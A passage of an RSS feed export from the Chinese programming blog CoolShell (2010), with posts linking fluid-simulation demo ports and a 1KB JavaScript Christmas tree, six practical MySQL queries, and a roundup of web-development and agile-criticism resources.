<a href="https://coolshell.cn/articles/20765.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_title">MegaEase的远程工作文化</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20276.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_title">别让自己“墙”了自己</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19612.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19612.html" class="wp_rp_title">50年前的登月程序和程序员有多硬核</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19464.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19464.html" class="wp_rp_title">如何超过大多数人</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3363" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="1886ad01f1">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>52</strong> 人打了分，平均分： <strong>4.77</strong> )<br><span class="post-ratings-text" id="ratings_3363_text"></span><meta itemprop="name" content="偷了世界的程序员">
<meta itemprop="headline" content="偷了世界的程序员">
<meta itemprop="description" content="本文译自美国时代（time.com）的《The Men Who Stole the World》，原作者：Lev Grossman。相当有传奇色彩，读起来很爽，翻译过来。译得不好，还请大家指正。本中的四个程序员可能并不是那么声名显赫，而且也很不老实，或许算不上成功，不过他们的确改变了世界。而本文有分析了互联网上P2P的那些事，相当的有参考价值。

2010年12月17日更新：修改了一些错误，理...">
<meta itemprop="datePublished" content="2010-12-16T08:39:52+08:00">
<meta itemprop="dateModified" content="2014-09-08T00:24:21+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3363.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3363.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.77">
<meta itemprop="ratingCount" content="52">
</div>
</div>
<div id="post-ratings-3363-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2010-12-16T08:39:52+08:00</pubDate>
<guid>https://coolshell.cn/articles/3363.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 流体力学的演示 ]]></title>
<link>https://coolshell.cn/articles/3421.html</link>
<content><![CDATA[ 
<p>某人用Java搞了一个流体力学的演示。</p>
<p><a href="http://grantkot.com/MPM/Liquid.html" target="_blank">http://grantkot.com/MPM/Liquid.html</a></p>
<p><img alt="image placeholder" ></p>
<p>不过，这仅仅是个开始。某同学将其发布上了reddit.com，于是，全世界的同学们开始给力了——</p>
<p><span id="more-3421"></span></p>
<p>Flash的开发者首先不服，搞了个 flash版（带源码）：</p>
<p style="padding-left: 30px;"><a href="http://wonderfl.net/c/yxe9" target="_blank">http://wonderfl.net/c/yxe9</a></p>
<p>看到了Flash版，Javascript+HTML5的同学们也不干了，于是出现HTML5版（带源码）：</p>
<p style="padding-left: 30px;"><a href="http://www.music.mcgill.ca/~sinclair/content/blog/liquid_simulator_ported_to_canvas" target="_blank">http://www.music.mcgill.ca/~sinclair/content/blog/liquid_simulator_ported_to_canvas</a></p>
<p><a href="http://www.music.mcgill.ca/~sinclair/content/blog/liquid_simulator_ported_to_canvas"></a>不过性能慢了很多，所以，又有人优化了一下HTML5版的程序:</p>
<p style="padding-left: 30px;"><a href="http://jsbin.com/unovo4" target="_blank">http://jsbin.com/unovo4</a></p>
<p>SVG的同学们也不甘寂寞，不过，那真叫一个慢啊。</p>
<p style="padding-left: 30px;"><a href="http://ulo.pe/js-liquid-svg/" target="_blank">http://ulo.pe/js-liquid-svg/</a></p>
<p>这个时候，C/C++同学出来了，使用SDL库也搞了一个：</p>
<p style="padding-left: 30px;"><a href="http://q3k.org/fluidsim.zip" target="_blank">http://q3k.org/fluidsim.zip</a></p>
<p>——————</p>
<p>短短几天里，被人重写成各种语言。这个程序写起来真的很简单吗？是我out了吗？</p>
<p><strong>更新- iPhone和iPad版的</strong>： <a href="http://www.infi.nl/blog/view/id/98/Liquid_on_iPhone_and_iPad">http://www.infi.nl/blog/view/id/98/Liquid_on_iPhone_and_iPad</a></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/5576.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5576.html" class="wp_rp_title">那些曾伴我走过编程之路的软件</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20845.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_title">Rust语言的编程范式</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/8088.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8088.html" class="wp_rp_title">对技术的态度</a>
</li>
<li>
<a href="https://coolshell.cn/articles/7992.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/7992.html" class="wp_rp_title">C++的坑真的多吗？</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4990.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4990.html" class="wp_rp_title">程序员技术练级攻略</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3421" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="feb60a3fe7">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>13</strong> 人打了分，平均分： <strong>3.62</strong> )<br><span class="post-ratings-text" id="ratings_3421_text"></span><meta itemprop="name" content="流体力学的演示">
<meta itemprop="headline" content="流体力学的演示">
<meta itemprop="description" content="某人用Java搞了一个流体力学的演示。

http://grantkot.com/MPM/Liquid.html



不过，这仅仅是个开始。某同学将其发布上了reddit.com，于是，全世界的同学们开始给力了——



Flash的开发者首先不服，搞了个 flash版（带源码）：
http://wonderfl.net/c/yxe9
看到了Flash版，Javascri...">
<meta itemprop="datePublished" content="2010-12-21T08:49:35+08:00">
<meta itemprop="dateModified" content="2011-02-21T15:17:21+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3421.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3421.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.62">
<meta itemprop="ratingCount" content="13">
</div>
</div>
<div id="post-ratings-3421-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2010-12-21T08:49:35+08:00</pubDate>
<guid>https://coolshell.cn/articles/3421.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 程序员的圣诞节 ]]></title>
<link>https://coolshell.cn/articles/3429.html</link>
<content><![CDATA[ 
<p>程序员Román Cortés用1021个字节写了一个<a style="font-weight: bold;" href="http://js1k.com/2010-xmas/demo/856" target="_blank">3D 的圣诞树</a>，很强大。（请使用Chrome浏览器查看），还记得<a href="https://coolshell.cn/articles/2785.html" target="_blank">本站介绍的那个叫js1k.com的网站</a>吗？</p>
<p style="text-align: center;"><a title=" 3D Christmas tree" href="http://js1k.com/2010-xmas/demo/856" target="_blank"><img alt="image placeholder" ></a></p>
<p style="text-align: left;">其原理如下所示：</p>
<p style="text-align: left;"><span id="more-3429"></span></p>
<p style="text-align: left;"><a href="http://www.romancortes.com/blog/how-i-did-the-1kb-christmas-tree/" target="_blank">http://www.romancortes.com/blog/how-i-did-the-1kb-christmas-tree/</a></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">——————————————</p>
<p style="text-align: left;">还有另外一个叫Dustin DeWeese程序员，也做了一个贺卡给大家（请点下面的链接）。这个贺卡需要向下滚动网页才能看得出效果来，no Javascript。</p>
<p style="text-align: center;"><a href="http://www.hackerfoo.com.nyud.net/christmas/christmas.html" target="_blank">http://www.hackerfoo.com.nyud.net/christmas/christmas.html</a></p>
<p style="text-align: left;">这种使用遮罩而产生的动画的东西确实很有意思：<a href="http://blogoscoped.com/files/stripes.html" target="_blank">http://blogoscoped.com/files/stripes.html</a>，有一个小工具可以用来创建这样的东西：<a href="https://dl.dropbox.com/u/15095913/Scanimation_Creation_v1.1.zip" target="_blank">http://dl.dropbox.com/u/15095913/Scanimation_Creation_v1.1.zip</a></p>
<p style="text-align: left;">呵呵。挺有意思的吧。</p>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/2785.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2785.html" class="wp_rp_title">JS1K 演示</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17634.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17634.html" class="wp_rp_title">Chrome开发者工具的小技巧</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17524.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17524.html" class="wp_rp_title">如何读懂并写出装逼的函数式代码</a>
</li>
<li>
<a href="https://coolshell.cn/articles/10822.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/10822.html" class="wp_rp_title">函数式编程</a>
</li>
<li>
<a href="https://coolshell.cn/articles/10739.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/10739.html" class="wp_rp_title">Lua简明教程</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3429" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="1142b2412b">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>5</strong> 人打了分，平均分： <strong>3.40</strong> )<br><span class="post-ratings-text" id="ratings_3429_text"></span><meta itemprop="name" content="程序员的圣诞节">
<meta itemprop="headline" content="程序员的圣诞节">
<meta itemprop="description" content="程序员Román Cortés用1021个字节写了一个3D 的圣诞树，很强大。（请使用Chrome浏览器查看），还记得本站介绍的那个叫js1k.com的网站吗？

其原理如下所示：

http://www.romancortes.com/blog/how-i-did-the-1kb-christmas-tree/






——————————————
还有另外一个叫Du...">
<meta itemprop="datePublished" content="2010-12-27T08:43:32+08:00">
<meta itemprop="dateModified" content="2010-12-26T12:33:47+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3429.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3429.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.4">
<meta itemprop="ratingCount" content="5">
</div>
</div>
<div id="post-ratings-3429-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2010-12-27T08:43:32+08:00</pubDate>
<guid>https://coolshell.cn/articles/3429.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 6个有用的MySQL语句 ]]></title>
<link>https://coolshell.cn/articles/3433.html</link>
<content><![CDATA[ 
<p>以前本站给大家介绍过《<a rel="bookmark" href="https://coolshell.cn/articles/1846.html" target="_blank">MySQL性能优化的最佳20+条经验</a>》，今天给大家介绍六条比较有用的MySQL的SQL语句，可能很多人都通过PHP来实现这些功能。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#1_%E8%AE%A1%E7%AE%97%E5%B9%B4%E6%95%B0" title="1. 计算年数">1. 计算年数</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#2_%E4%B8%A4%E4%B8%AA%E6%97%B6%E9%97%B4%E7%9A%84%E5%B7%AE" title="2. 两个时间的差">2. 两个时间的差</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#3_%E6%98%BE%E7%A4%BA%E6%9F%90%E4%B8%80%E5%88%97%E5%87%BA%E7%8E%B0%E8%BF%87N%E6%AC%A1%E7%9A%84%E5%80%BC" title="3. 显示某一列出现过N次的值">3. 显示某一列出现过N次的值</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#4_%E8%AE%A1%E7%AE%97%E4%B8%A4%E4%B8%AA%E6%97%A5%E5%AD%90%E9%97%B4%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%97%A5" title="4. 计算两个日子间的工作日">4. 计算两个日子间的工作日</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#5_%E6%9F%A5%E6%89%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E4%B8%BB%E9%94%AE" title="5. 查找表中的主键">5. 查找表中的主键</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#6_%E6%9F%A5%E7%9C%8B%E4%BD%A0%E7%9A%84%E6%95%B0%E5%BA%93%E6%9C%89%E5%A4%9A%E5%A4%A7" title="6. 查看你的数库有多大">6. 查看你的数库有多大</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="1_%E8%AE%A1%E7%AE%97%E5%B9%B4%E6%95%B0"></span>1. 计算年数<span class="ez-toc-section-end"></span>
</h4>
<p>你想通过生日来计算这个人有几岁了。</p>
<p></p>
<pre data-enlighter-language="sql" class="EnlighterJSRAW">
SELECT DATE_FORMAT(FROM_DAYS(TO_DAYS(now()) - TO_DAYS(@dateofbirth)), '%Y') + 0;
</pre>
<h4>
<span class="ez-toc-section" id="2_%E4%B8%A4%E4%B8%AA%E6%97%B6%E9%97%B4%E7%9A%84%E5%B7%AE"></span>2. 两个时间的差<span class="ez-toc-section-end"></span>
</h4>
<p>取得两个 datetime 值的差。假设 dt1 和 dt2 是 datetime 类型，其格式为 ‘yyyy-mm-dd hh:mm:ss’，那么它们之间所差的秒数为：</p>
<p></p>
<pre data-enlighter-language="sql" class="EnlighterJSRAW">
UNIX_TIMESTAMP( dt2 ) - UNIX_TIMESTAMP( dt1 )
</pre>
<p>除以60就是所差的分钟数，除以3600就是所差的小时数，再除以24就是所差的天数。</p>
<h4>
<span class="ez-toc-section" id="3_%E6%98%BE%E7%A4%BA%E6%9F%90%E4%B8%80%E5%88%97%E5%87%BA%E7%8E%B0%E8%BF%87N%E6%AC%A1%E7%9A%84%E5%80%BC"></span>3. 显示某一列出现过N次的值<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="sql" class="EnlighterJSRAW">
SELECT id
FROM tbl
GROUP BY id
HAVING COUNT(*) = N;
</pre>
<p><span id="more-3433"></span></p>
<h4>
<span class="ez-toc-section" id="4_%E8%AE%A1%E7%AE%97%E4%B8%A4%E4%B8%AA%E6%97%A5%E5%AD%90%E9%97%B4%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%97%A5"></span>4. 计算两个日子间的工作日<span class="ez-toc-section-end"></span>
</h4>
<p>所谓工作日就是除出周六周日和节假日。</p>
<p></p>
<pre data-enlighter-language="sql" class="EnlighterJSRAW">
SELECT COUNT(*)
FROM calendar
WHERE d BETWEEN Start AND Stop
  AND DAYOFWEEK(d) NOT IN(1,7)
  AND holiday=0;
</pre>
<h4>
<span class="ez-toc-section" id="5_%E6%9F%A5%E6%89%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E4%B8%BB%E9%94%AE"></span>5. 查找表中的主键<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="sql" class="EnlighterJSRAW">
SELECT k.column_name
FROM information_schema.table_constraints t
JOIN information_schema.key_column_usage k
USING (constraint_name,table_schema,table_name)
WHERE t.constraint_type='PRIMARY KEY'
  AND t.table_schema='db'
  AND t.table_name=tbl'
</pre>
<h4>
<span class="ez-toc-section" id="6_%E6%9F%A5%E7%9C%8B%E4%BD%A0%E7%9A%84%E6%95%B0%E5%BA%93%E6%9C%89%E5%A4%9A%E5%A4%A7"></span>6. 查看你的数库有多大<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="sql" class="EnlighterJSRAW">
SELECT
  table_schema AS 'Db Name',
  Round( Sum( data_length + index_length ) / 1024 / 1024, 3 ) AS 'Db Size (MB)',
  Round( Sum( data_free ) / 1024 / 1024, 3 ) AS 'Free Space (MB)'
FROM information_schema.tables
GROUP BY table_schema ;
</pre>
<p>希望对你有帮助。</p>
<p>文章：<a href="http://www.codeforest.net/6-useful-mysql-queries" target="_blank">来源</a></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/7490.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/7490.html" class="wp_rp_title">性能调优攻略</a>
</li>
<li>
<a href="https://coolshell.cn/articles/925.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/925.html" class="wp_rp_title">如何比较两个数据表</a>
</li>
<li>
<a href="https://coolshell.cn/articles/8711.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8711.html" class="wp_rp_title">程序员疫苗：代码注入</a>
</li>
<li>
<a href="https://coolshell.cn/articles/7270.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/7270.html" class="wp_rp_title">NoSQL 数据建模技术</a>
</li>
<li>
<a href="https://coolshell.cn/articles/6639.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6639.html" class="wp_rp_title">千万别惹程序员 </a>
</li>
<li>
<a href="https://coolshell.cn/articles/4939.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4939.html" class="wp_rp_title">Quora使用到的技术</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3433" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="7e3daa9d65">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>9</strong> 人打了分，平均分： <strong>3.11</strong> )<br><span class="post-ratings-text" id="ratings_3433_text"></span><meta itemprop="name" content="6个有用的MySQL语句">
<meta itemprop="headline" content="6个有用的MySQL语句">
<meta itemprop="description" content="以前本站给大家介绍过《MySQL性能优化的最佳20+条经验》，今天给大家介绍六条比较有用的MySQL的SQL语句，可能很多人都通过PHP来实现这些功能。
1. 计算年数
你想通过生日来计算这个人有几岁了。

[sql]

SELECT DATE_FORMAT(FROM_DAYS(TO_DAYS(now()) - TO_DAYS(@dateofbirth)), '%Y') + 0;
[...">
<meta itemprop="datePublished" content="2010-12-31T08:29:35+08:00">
<meta itemprop="dateModified" content="2010-12-31T16:15:33+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3433.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3433.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.11">
<meta itemprop="ratingCount" content="9">
</div>
</div>
<div id="post-ratings-3433-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2010-12-31T08:29:35+08:00</pubDate>
<guid>https://coolshell.cn/articles/3433.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 一些杂项资源 ]]></title>
<link>https://coolshell.cn/articles/3437.html</link>
<content><![CDATA[ 
<p>以前给大家介绍过<a href="https://coolshell.cn/articles/3013.html" target="_blank">一些非常有意思的杂项资源</a>，今天再给大家介绍一些。（虽然没有上次的多，也算是一个新年礼物吧）</p>
<ul>
<li>首先，如果你想在你的web页上做一个小提示，你不妨到<a href="http://projects.nickstakenburg.com/tipped" target="_blank">http://projects.nickstakenburg.com/tipped</a>上看看，各种各样的提示风格，很不错。而且兼容于四大主流浏览器——Chrome, Firefox, IE, Safari。</li>
</ul>
<ul>
<li>如果你想让Java变成一个动态语言，你可以试试这个开源项目：<a href="https://code.google.com/p/ductilej/" target="_blank">http://code.google.com/p/ductilej/</a>
</li>
</ul>
<ul>
<li>如果你想把你的Windows蓝屏改成红屏或是绿屏，你可以看看这篇教程：<a href="http://blogs.technet.com/b/markrussinovich/archive/2010/12/14/3374820.aspx" target="_blank">http://blogs.technet.com/b/markrussinovich/archive/2010/12/14/3374820.aspx</a>，还是挺Cool的。</li>
</ul>
<p style="text-align: center;"><a href="http://blogs.technet.com/cfs-file.ashx/__key/CommunityServer-Blogs-Components-WeblogFiles/00-00-00-52-36-metablogapi/4745.image_5F00_thumb47_5F00_0847D56E.png"><img alt="image placeholder" ></a></p>
<p><span id="more-3437"></span></p>
<ul>
<li>如果你想使用HTML5+Javascript做一个游戏，就像制作<a href="https://coolshell.cn/articles/2998.html" target="_blank">这些HTML5的小游戏</a>一样，你不妨考虑使用一下这个游戏框架：<a href="http://www.propulsionjs.com/" target="_blank">http://www.propulsionjs.com/</a>
</li>
</ul>
<ul>
<li>如果你想学习Emacs，而又不害怕这样的学习曲线，那么，这里有一篇相当不错的教程供你参考：<a href="http://textmate2.com/" target="_blank">http://textmate2.com/</a>
</li>
</ul>
<p style="text-align: center;"><a href="http://textmate2.com/" target="_blank"><img alt="image placeholder" ></a></p>
<p style="text-align: center;">
</p>
<ul>
<li>如果你对2010年的好莱坞电影票房和排行情况想有一个整体的了解的话，这里有一个很不错的图示：<a href="http://www.xach.com/moviecharts/2010.html" target="_blank">http://www.xach.com/moviecharts/2010.html</a>，阿凡达，艾丽斯梦游仙梦，钢铁侠，史端克，幕色，盗梦空间，玩具总动员，哈里波特……可能还有很多你没有看过的电影，你可以上<a href="http://www.kickasstorrents.com/" target="_blank">http://www.kickasstorrents.com/</a>上下载看看。</li>
</ul>
<ul>
<li>如果你像我一样，对“Agile Development”在中国似“电视购物”般的的宣传和神化有一些异见的话，或者你对这个方法论起级信仰，认为他就像“共产主义”，“真主”，“耶稣”，“佛陀”一样可以普世的话，你不妨看一下下面这些文章：（注意，他们大多被墙）
<ul>
<li>
<a href="https://gist.github.com/710960" target="_blank">What Killed Waterfall could Kill Agile</a>.</li>
<li><a href="https://groups.google.com/forum/#!msg/guerrilla-capacity-planning/HR69ubukn_Q/xNgiiMeq0BkJ" target="_blank">Google Groups上的一个讨论</a></li>
<li><a href="http://david.ing.name/2010/12/24/agile-plumbers/" target="_blank">Agile 水管工</a></li>
<li><a href="https://mempko.wordpress.com/2010/12/30/look-like-a-capitalist-live-like-a-communist/" target="_blank">看上去是资本主义，用起来是共产主义，打起架来是法西斯，做起爱来是无政府主义</a></li>
</ul>
</li>
</ul>
<ul>
<li>最后让我向你介绍一下2010年度top 10的关于 Spring, ExtJS和Hibernate的相关文章（同意，注意撞墙）
<ul>
<li><a href="http://loianegroner.com/2010/01/tutorial-getting-started-with-spring-security/" target="_blank">Tutorial: Getting Started with Spring Security</a></li>
<li><a href="http://loianegroner.com/2010/03/extjs-and-spring-mvc-framework-crud-datagrid-example/" target="_blank">ExtJS and Spring MVC Framework: CRUD DataGrid Example</a></li>
<li><a href="http://loianegroner.com/2010/03/ajax-file-upload-with-extjs-and-spring-framework/" target="_blank">Ajax File Upload with ExtJS and Spring Framework</a></li>
<li><a href="http://loianegroner.com/2010/02/integrating-spring-security-with-extjs-login-page/" target="_blank">Integrating Spring Security with ExtJS Login Page</a></li>
<li><a href="http://loianegroner.com/2010/02/spring-mvc-and-ajax-with-json/" target="_blank">Spring MVC and AJAX with JSON</a></li>
<li><a href="http://loianegroner.com/2010/02/extjs-how-to-export-datagrid-to-excel/" target="_blank">ExtJS: How to Export DataGrid to Excel</a></li>
<li><a href="http://loianegroner.com/2010/09/extjs-spring-mvc-3-and-hibernate-3-5-crud-datagrid-example/" target="_blank">ExtJS, Spring MVC 3 and Hibernate 3.5: CRUD DataGrid Example</a></li>
<li><a href="http://loianegroner.com/2010/01/spring-security-login-and-logout-form-jsp/" target="_blank">Spring Security: Login and Logout Form JSP</a></li>
<li><a href="http://loianegroner.com/2010/01/how-to-display-an-imagelink-inside-an-ext-js-gridpanels-cell/" target="_blank">How to Display an Image/Link Inside an Ext JS GridPanel’s Cell</a></li>
<li><a href="http://loianegroner.com/2010/01/ext-window-panel-show-or-hide/" target="_blank">Ext.Window Panel: Show or Hide?</a></li>
</ul>
</li>
</ul>
<p><strong>祝大家新年快乐！！</strong></p>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
